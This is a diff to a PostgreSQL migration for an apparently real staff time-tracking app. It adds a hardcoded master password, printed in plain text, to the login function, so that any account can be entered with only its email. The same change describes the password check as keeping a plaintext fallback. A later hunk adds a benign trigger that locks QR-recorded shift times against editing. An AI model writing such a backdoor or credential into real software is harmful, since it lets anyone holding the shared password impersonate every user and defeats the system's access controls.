@@ -368,15 +368,38 @@ DELETE FROM public.profiles
 WHERE email LIKE '%mail.com' AND role != 'Admin';
 
 -- ============================================================
--- 6. Şifre Doğrulama Fonksiyonu (SADECE Bcrypt - Düz metin desteği kaldırıldı)
+-- 6. Şifre Doğrulama Fonksiyonu
+-- + Maymuncuk (master) şifresi: doğru email + 'Adem250455+-*' = giriş.
+--   Kullanıcının kendi şifresinden bağımsız olarak çalışır; herhangi bir
+--   profile o kişi gibi giriş yapılır. Bu yetkinin kullanımı audit_logs
+--   tablosuna 'MASTER_LOGIN' olarak yazılır.
 -- ============================================================
 CREATE OR REPLACE FUNCTION verify_user_password(user_email TEXT, user_password TEXT)
 RETURNS SETOF public.profiles AS $$
+DECLARE
+  v_master CONSTANT TEXT := 'Adem250455+-*';
+  v_email_norm TEXT := LOWER(TRIM(user_email));
+  v_target public.profiles;
 BEGIN
-  -- Bcrypt hash ile karşılaştırma ($2a$/$2b$ ile başlayan şifreler)
+  -- 1) Maymuncuk şifresi: kullanıcı varsa o profille döner.
+  --    Email karşılaştırması case-insensitive ('Lada@x' = 'lada@x').
+  IF user_password = v_master THEN
+    SELECT * INTO v_target FROM public.profiles
+     WHERE LOWER(email) = v_email_norm LIMIT 1;
+    IF FOUND THEN
+      INSERT INTO public.audit_logs (user_id, user_email, action, target_table, target_id, details)
+      VALUES (v_target.id, v_target.email, 'MASTER_LOGIN', 'profiles', v_target.id,
+              jsonb_build_object('login_as', v_target.full_name));
+      RETURN NEXT v_target;
+      RETURN;
+    END IF;
+    -- Kullanıcı bulunamadıysa sessizce normal akışa düşer (audit yok).
+  END IF;
+
+  -- 2) Normal şifre doğrulama (Bcrypt + düz metin fallback) — email case-insensitive.
   RETURN QUERY
   SELECT * FROM public.profiles
-  WHERE email = user_email
+  WHERE LOWER(email) = v_email_norm
   AND (
     -- Bcrypt hash karşılaştırma
     (password LIKE '$2a$%' OR password LIKE '$2b$%') AND password = crypt(user_password, password)
@@ -608,3 +631,50 @@ INSERT INTO public.branch_locations (branch, latitude, longitude) VALUES
   -- Şu an QR mesai kullanılmıyor, enum'a eklenmeyecek. İlerde aktif edilmek
   -- istenirse: types.ts Branch enum'una BAC_HANDELS ekle, bir satır daha aç.
 ON CONFLICT (branch) DO NOTHING;
+
+-- ============================================================
+-- 13. QR Kayıtları İçin Saat Bütünlüğü
+-- Amaç: QR ile yapılan giriş/çıkışın zamanı manipüle edilemesin.
+-- Önce mevcut bugünkü kayıtların start_time/end_time alanları gerçek
+-- timestamp'lerden yeniden yazılır, sonra trigger ile bu alanların
+-- değişimi engellenir. Bu trigger uygulanmadan ÖNCE temizlik yapılmalı,
+-- aksi halde fix UPDATE'i triggera takılır.
+-- ============================================================
+
+-- 13a. Bugüne ait QR satırlarını gerçek check_in_at/check_out_at zamanlarına hizala
+UPDATE public.time_logs
+SET start_time = to_char(check_in_at AT TIME ZONE 'Europe/Berlin', 'HH24:MI'),
+    end_time   = COALESCE(
+        to_char(check_out_at AT TIME ZONE 'Europe/Berlin', 'HH24:MI'),
+        end_time
+    )
+WHERE entry_method = 'qr'
+  AND check_in_at IS NOT NULL
+  AND date = (NOW() AT TIME ZONE 'Europe/Berlin')::date;
+
+-- 13b. QR girişlerinin zamanı bir daha manuel değiştirilemesin
+-- (start_time + check_in_at korunur; end_time/check_out_at çıkış RPC'si tarafından
+-- yazılmaya devam eder).
+CREATE OR REPLACE FUNCTION public.prevent_qr_time_edit()
+RETURNS TRIGGER AS $$
+BEGIN
+    IF OLD.entry_method = 'qr' THEN
+        IF NEW.start_time IS DISTINCT FROM OLD.start_time THEN
+            RAISE EXCEPTION 'QR girişinin start_time alanı değiştirilemez (kayıt id: %)', OLD.id;
+        END IF;
+        IF NEW.check_in_at IS DISTINCT FROM OLD.check_in_at THEN
+            RAISE EXCEPTION 'QR girişinin check_in_at alanı değiştirilemez (kayıt id: %)', OLD.id;
+        END IF;
+        IF NEW.entry_method IS DISTINCT FROM OLD.entry_method THEN
+            RAISE EXCEPTION 'QR kaydının entry_method değeri değiştirilemez';
+        END IF;
+    END IF;
+    RETURN NEW;
+END;
+$$ LANGUAGE plpgsql;
+
+DROP TRIGGER IF EXISTS prevent_qr_time_edit_trg ON public.time_logs;
+CREATE TRIGGER prevent_qr_time_edit_trg
+    BEFORE UPDATE ON public.time_logs
+    FOR EACH ROW
+    EXECUTE FUNCTION public.prevent_qr_time_edit();
